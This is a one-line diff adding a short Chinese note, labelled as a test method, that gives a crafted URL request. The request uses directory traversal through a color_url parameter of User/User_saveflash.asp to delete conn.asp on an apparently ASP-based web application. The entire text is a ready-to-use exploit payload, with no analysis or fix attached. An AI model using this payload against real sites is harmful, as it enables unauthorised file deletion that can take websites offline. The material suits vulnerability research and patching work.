@@ -1,0 +1,1 @@
+测试方法：构造如下语句，可以删除conn.asp文件：User/User_saveflash.asp?act=aa&color_url=../conn.asp
